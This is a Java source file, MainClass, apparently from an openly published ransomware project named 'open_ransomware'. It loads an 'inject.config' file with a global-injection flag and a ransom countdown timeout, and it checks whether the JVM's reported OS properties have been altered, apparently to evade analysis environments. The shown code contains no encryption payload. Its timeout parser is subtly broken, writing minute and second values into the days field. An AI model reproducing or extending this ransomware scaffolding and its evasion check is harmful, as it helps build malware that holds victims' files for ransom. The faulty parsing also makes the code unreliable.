package com.bechris100.open_ransomware;

import com.bechris100.open_ransomware.config.ConfigException;
import com.bechris100.open_ransomware.config.ConfigParser;
import com.bechris100.open_ransomware.config.Configuration;
import com.bechris100.open_ransomware.utils.RuntimeEnvironment;

import java.io.IOException;

public class MainClass {

    private static void applyTimeout(String val) {
        try {
            if (val.contains(",")) {
                String[] timeVal = val.split(",");
                for (String v : timeVal) {
                    if (v.contains("d")) {
                        v = v.replace("d", "");
                        RansomwareClass.timeoutDays = Integer.parseInt(v);
                    } else if (v.contains("h")) {
                        v = v.replace("h", "");
                        RansomwareClass.timeoutHours = Integer.parseInt(v);
                    } else if (v.contains("m")) {
                        v = v.replace("m", "");
                        RansomwareClass.timeoutDays = Integer.parseInt(v);
                    } else if (v.contains("s")) {
                        v = v.replace("s", "");
                        RansomwareClass.timeoutDays = Integer.parseInt(v);
                    }
                }
            } else {
                if (val.contains("d")) {
                    val = val.replace("d", "");
                    RansomwareClass.timeoutDays = Integer.parseInt(val);
                } else if (val.contains("h")) {
                    val = val.replace("h", "");
                    RansomwareClass.timeoutHours = Integer.parseInt(val);
                } else if (val.contains("m")) {
                    val = val.replace("m", "");
                    RansomwareClass.timeoutMinutes = Integer.parseInt(val);
                } else if (val.contains("s")) {
                    val = val.replace("s", "");
                    RansomwareClass.timeoutSeconds = Integer.parseInt(val);
                }
            }
        } catch (NumberFormatException e) {
            System.err.println("One of the values at \"" + val + "\" has been formatted wrong into a valid Integer value.");
            System.err.println("Software crashed with exit code 1");
            System.exit(1);
        }
    }

    private static void loadConfigurations() {
        try {
            ConfigParser.loadFromResource("res/inject.config");

            for (Configuration config : ConfigParser.list) {
                String na = config.name;
                String val = config.value;

                switch (na) {
                    case "JavaVM_OperatingSystemModifications" -> {
                        if (!(val.equals("true") || val.equals("false")))
                            throw new ConfigException("Configuration value \"" + val + "\" is not a valid Boolean");

                        RansomwareClass.osValueModificationsEnabled = Boolean.parseBoolean(val);
                    }
                    case "JavaVM_OSModificationDetectedMessage_OsName" ->
                        RansomwareClass.javaVmOsNameModified = val;
                    case "JavaVM_OSModificationDetectedMessage_OsArch" ->
                            RansomwareClass.javaVmOsArchModified = val;
                    case "JavaVM_OSModificationDetectedMessage_OsVersion" ->
                            RansomwareClass.javaVmOsVersionModified = val;
                    case "Timeout" -> applyTimeout(val);
                    case "GlobalInjection" -> {
                        if (!(val.contains("true") || val.contains("false")))
                            throw new ConfigException("Configuration value \"" + val + "\" is not a valid Boolean");
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        loadConfigurations();

        if (RansomwareClass.osValueModificationsEnabled) {
            if (RuntimeEnvironment.countRuntimeModifications() >= 1) {
                if (RuntimeEnvironment.osNameModified())
                    System.err.println(RansomwareClass.javaVmOsNameModified);

                if (RuntimeEnvironment.osArchModified())
                    System.err.println(RansomwareClass.javaVmOsArchModified);

                if (RuntimeEnvironment.osVersionModified())
                    System.err.println(RansomwareClass.javaVmOsVersionModified);

                System.err.println("Software crashed with exit value 1");
                System.exit(1);
            }
        }
    }

}
